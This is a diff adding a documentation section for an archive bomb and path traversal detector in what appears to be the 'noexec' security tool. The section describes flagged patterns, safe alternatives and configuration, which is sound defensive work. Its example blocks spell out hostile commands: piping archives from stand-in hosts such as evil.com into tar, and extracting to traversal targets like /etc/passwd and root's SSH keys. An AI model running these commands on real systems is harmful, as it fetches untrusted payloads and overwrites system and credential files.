@@ -11,6 +11,7 @@
 - [Package Manager Poisoning Detector](#package-manager-poisoning-detector)
 - [Code Injection Detector](#code-injection-detector)
 - [Binary Download & Execute Detector](#binary-download--execute-detector)
+- [Archive Bomb/Path Traversal Detector](#archive-bombpath-traversal-detector)
 - [Network Exfiltration Detector](#network-exfiltration-detector)
 - [Backdoor/Persistence Detector](#backdoorpersistence-detector)
 - [Container Escape Detector](#container-escape-detector)
@@ -2195,6 +2196,422 @@ export function detectSecurityToolDisabling(toolUseData: ToolUseData): Promise<D
   }
 
   // ... rest of detection logic
+}
+```
+
+---
+
+## Archive Bomb/Path Traversal Detector
+
+**File:** `src/detectors/archive-bomb.ts`
+
+Detects archive-based attacks including archive bombs, path traversal, and unsafe extraction. Protects against malicious archives that could fill disk space, overwrite system files, or exploit extraction vulnerabilities.
+
+### What It Detects
+
+#### 1. Untrusted Archive Extraction
+
+Extracting archives from untrusted sources without validation.
+
+**Patterns:**
+
+- `curl https://... | tar xz` - Piped extraction from network
+- `wget -O- https://... | tar xf -` - Wget piped to tar
+- `curl https://... | unzip -` - Piped unzip
+- `tar xzf https://...` - Direct URL extraction
+- `curl | gunzip | tar x` - Multi-stage piped extraction
+
+**Why dangerous:** Downloaded archives may contain:
+
+- Archive bombs (10GB → 100TB extraction)
+- Path traversal attacks (../../etc/passwd)
+- Symbolic link attacks
+- Malicious executables or scripts
+
+**Examples:**
+
+```bash
+# ✗ Untrusted extraction
+curl https://evil.com/archive.tar.gz | tar xz
+wget -O- https://attacker.com/bomb.tar | tar xf -
+curl https://malicious.com/file.zip | unzip -
+
+# ✓ Safe: download, validate, then extract
+curl -o archive.tar.gz https://example.com/file.tar.gz
+sha256sum archive.tar.gz  # Verify checksum
+tar xzf archive.tar.gz --no-same-owner
+```
+
+#### 2. Path Traversal Patterns
+
+Detects directory traversal sequences that could overwrite files outside the extraction directory.
+
+**Patterns:**
+
+- Multiple `../` sequences: `../../../etc/passwd`
+- Path traversal to sensitive directories: `../../etc/`, `../../root/`
+- Backslash traversal (Windows): `..\..\windows\`
+
+**Why dangerous:** Path traversal can:
+
+- Overwrite system files (/etc/passwd, /etc/shadow)
+- Replace binaries (/bin/bash, /usr/bin/sudo)
+- Install backdoors in startup scripts
+- Modify SSH configurations
+
+**Examples:**
+
+```bash
+# ✗ Path traversal detected
+tar xzf malicious.tar.gz ../../../etc/passwd
+unzip evil.zip ../../root/.ssh/authorized_keys
+7z x attack.7z ../../../../usr/bin/sudo
+
+# ✓ Safe: extract to current directory
+tar xzf archive.tar.gz
+unzip file.zip
+```
+
+#### 3. Extracting to Sensitive Locations
+
+Detects extraction directly to system directories.
+
+**Dangerous locations:**
+
+- `/etc` - System configuration
+- `/usr/bin`, `/usr/local/bin` - System binaries
+- `/bin`, `/sbin` - Core system commands
+- `/root` - Root user home directory
+
+**Patterns:**
+
+- `tar xzf file.tar.gz -C /etc`
+- `tar xf file.tar --directory /usr/bin`
+- `unzip file.zip -d /bin`
+- `cd /etc && tar xzf archive.tar.gz`
+
+**Examples:**
+
+```bash
+# ✗ Extracting to system directories
+tar xzf archive.tar.gz -C /etc
+tar xf malicious.tar --directory=/usr/bin
+unzip backdoor.zip -d /usr/local/bin
+cd /etc && tar xzf config.tar.gz
+
+# ✓ Safe: extract to user directories
+tar xzf archive.tar.gz -C ~/downloads
+tar xf file.tar --directory=./build
+unzip project.zip -d ./src
+```
+
+#### 4. Missing Safety Flags
+
+Detects tar extraction without critical safety flags.
+
+**Critical flag:** `--no-same-owner`
+
+- Prevents preserving file ownership from archive
+- Mitigates symbolic link attacks
+- Prevents privilege escalation
+
+**Why important:** Without `--no-same-owner`, malicious archives can:
+
+- Create files owned by root
+- Set setuid bits on executables
+- Exploit race conditions via symbolic links
+
+**Examples:**
+
+```bash
+# ✗ Missing safety flags (medium severity)
+tar xzf untrusted.tar.gz
+tar xf archive.tar
+
+# ✓ Safe: with safety flags
+tar xzf archive.tar.gz --no-same-owner --no-same-permissions
+tar xf file.tar --no-same-owner
+```
+
+#### 5. Recursive Extraction (Archive Bomb Indicator)
+
+Detects patterns that extract multiple archives, potentially indicating an archive bomb.
+
+**Archive bombs:** Archives containing nested archives that expand exponentially:
+
+- `bomb.zip` (42KB) → 10 nested layers → 4.5 petabytes
+- Designed to fill disk space and crash systems
+
+**Patterns:**
+
+- `find . -name "*.tar.gz" | xargs tar xzf` - Extract all found archives
+- `for f in *.zip; do unzip $f; done` - Loop through archives
+- `tar xzf *.tar.gz` - Wildcard extraction
+- `tar xzf outer.tar.gz && tar xzf inner.tar.gz` - Nested extraction
+
+**Examples:**
+
+```bash
+# ✗ Recursive extraction patterns
+find /tmp -name "*.tar.gz" | xargs tar xzf
+for archive in *.zip; do unzip $archive; done
+tar xzf *.tar.gz
+tar xzf layer1.tar.gz && tar xzf layer2.tar.gz
+
+# ✓ Safe: single archive extraction
+tar xzf specific-archive.tar.gz
+unzip myfile.zip
+```
+
+#### 6. Zip Slip Vulnerabilities
+
+Detects archive extraction in programming languages without path validation.
+
+**Languages detected:**
+
+- **Python:** `ZipFile().extractall()`, `tarfile.extractall()`
+- **Java:** `ZipInputStream`, `ZipFile.extract()`
+- **Node.js:** `unzipper.Extract()`, `extract-zip`
+- **Ruby:** `Zip::File.open().extract()`
+- **.NET:** `ZipFile.ExtractToDirectory()`
+
+**Vulnerability:** These libraries extract files without validating paths, allowing `../` sequences to overwrite arbitrary files.
+
+**Examples:**
+
+```bash
+# ✗ Zip slip vulnerabilities
+python3 -c "from zipfile import ZipFile; ZipFile(file).extractall()"
+node -e "require(unzipper).Extract({path: .})"
+ruby -e "require zip; Zip::File.open(file.zip).extract"
+
+# ✓ Safe: with validation
+python3 -c "import zipfile; zf=zipfile.ZipFile(f); [zf.extract(m) for m in zf.namelist() if not ../ in m]"
+```
+
+#### 7. Large File Extraction Without Checks
+
+Detects extraction of potentially large archives without size or disk space validation.
+
+**Risk:** Archive bombs can expand to fill entire disk:
+
+- Input: 42 KB zip file
+- Output: 4.5 petabytes (millions of times larger)
+- Result: System crash, denial of service
+
+**Patterns:**
+
+- Piped extraction without size limits
+- No disk space checks (`df`, `du`) before extraction
+
+**Examples:**
+
+```bash
+# ✗ No size validation
+curl https://unknown.com/huge.tar.gz | tar xz
+wget -O- https://site.com/bomb.zip | unzip
+
+# ✓ Safe: check size first
+curl -I https://site.com/file.tar.gz | grep Content-Length
+df -h .  # Check available space
+tar xzf file.tar.gz
+```
+
+### Severity Levels
+
+- **High:**
+  - Untrusted extraction (piped from curl/wget)
+  - Path traversal attacks
+  - Extraction to sensitive system directories
+  - Recursive extraction patterns
+  - Zip slip vulnerabilities in code
+
+- **Medium:**
+  - Missing safety flags (--no-same-owner)
+  - Large file extraction without validation
+  - Extracting archives containing sensitive filenames
+
+### Safe Operations
+
+These operations are allowed:
+
+```bash
+# ✓ Listing archive contents (read-only)
+tar tf archive.tar.gz
+tar tvf archive.tar
+unzip -l file.zip
+7z l archive.7z
+
+# ✓ Creating archives
+tar czf backup.tar.gz ./data
+zip -r archive.zip ./folder
+7z a backup.7z files/
+
+# ✓ Extraction with safety flags
+tar xzf file.tar.gz --no-same-owner --no-same-permissions
+
+# ✓ Package managers
+apt install package
+npm install package
+pip install package
+
+# ✓ Extraction with validation
+tar tzf file.tar.gz | grep -v "\.\." && tar xzf file.tar.gz
+```
+
+### Examples
+
+#### Dangerous (Trigger Detection)
+
+```bash
+# Untrusted sources
+curl https://evil.com/bomb.tar.gz | tar xz
+wget -O- https://attacker.com/malware.tar | tar xf -
+curl https://malicious.com/archive.zip | unzip -
+
+# Path traversal
+tar xzf evil.tar.gz ../../../etc/passwd
+unzip malicious.zip ../../root/.ssh/id_rsa
+7z x attack.7z ../../../../usr/bin/sudo
+
+# Extracting to system directories
+tar xzf rootkit.tar.gz -C /etc
+tar xf backdoor.tar --directory=/usr/bin
+unzip malware.zip -d /usr/local/bin
+cd /etc && tar xzf config.tar.gz
+
+# Missing safety flags
+tar xzf untrusted-archive.tar.gz
+tar xf suspicious.tar
+
+# Recursive extraction
+find . -name "*.tar.gz" | xargs tar xzf
+for f in *.zip; do unzip $f; done
+tar xzf outer.tar.gz && tar xzf inner.tar.gz
+
+# Zip slip in code
+python3 -c "from zipfile import ZipFile; ZipFile(evil.zip).extractall()"
+node -e "require(unzipper).Extract({path: .})"
+
+# Large files without checks
+curl https://unknown.com/huge-file.tar.gz | tar xz
+```
+
+#### Safe (No Detection)
+
+```bash
+# Listing contents
+tar tf archive.tar.gz
+unzip -l file.zip
+7z l archive.7z
+
+# Creating archives
+tar czf backup.tar.gz ./data
+zip -r archive.zip ./project
+
+# Safe extraction
+tar xzf file.tar.gz --no-same-owner --no-same-permissions
+tar xzf local-archive.tar.gz -C ~/downloads
+unzip project.zip
+
+# Package managers
+npm install express
+pip install requests
+apt install nginx
+
+# With validation
+tar tzf file.tar.gz | grep -v "\.\." && tar xzf file.tar.gz
+sha256sum archive.tar.gz && tar xzf archive.tar.gz
+```
+
+### Prevention Best Practices
+
+1. **Always download first, then extract:**
+
+   ```bash
+   curl -o file.tar.gz https://example.com/file.tar.gz
+   # Inspect/validate
+   tar xzf file.tar.gz --no-same-owner
+   ```
+
+2. **Verify checksums:**
+
+   ```bash
+   curl -o file.tar.gz https://example.com/file.tar.gz
+   echo "expected-sha256-hash  file.tar.gz" | sha256sum -c
+   tar xzf file.tar.gz
+   ```
+
+3. **List contents before extraction:**
+
+   ```bash
+   tar tzf archive.tar.gz
+   # Check for path traversal or suspicious files
+   tar xzf archive.tar.gz --no-same-owner
+   ```
+
+4. **Use safety flags:**
+
+   ```bash
+   tar xzf file.tar.gz --no-same-owner --no-same-permissions
+   ```
+
+5. **Extract to isolated directory:**
+
+   ```bash
+   mkdir /tmp/extract-safe
+   cd /tmp/extract-safe
+   tar xzf ~/downloads/archive.tar.gz
+   ```
+
+6. **Check disk space:**
+
+   ```bash
+   df -h .
+   tar xzf large-archive.tar.gz
+   ```
+
+7. **In code, validate paths:**
+
+   ```python
+   import zipfile
+   import os
+
+   def safe_extract(zip_path, dest):
+       with zipfile.ZipFile(zip_path) as zf:
+           for member in zf.namelist():
+               # Validate path
+               if ".." in member or member.startswith("/"):
+                   raise Exception(f"Dangerous path: {member}")
+               zf.extract(member, dest)
+   ```
+
+### How to Customize
+
+#### Disable Specific Checks
+
+```typescript
+// In noexec.config.json
+{
+  "detectors": {
+    "archive-bomb": {
+      "enabled": false  // Disable entirely
+    }
+  }
+}
+```
+
+#### Adjust Severity
+
+```typescript
+// In noexec.config.json
+{
+  "detectors": {
+    "archive-bomb": {
+      "enabled": true,
+      "severity": "medium"  // Lower from "high" to "medium"
+    }
+  }
 }
 ```
 
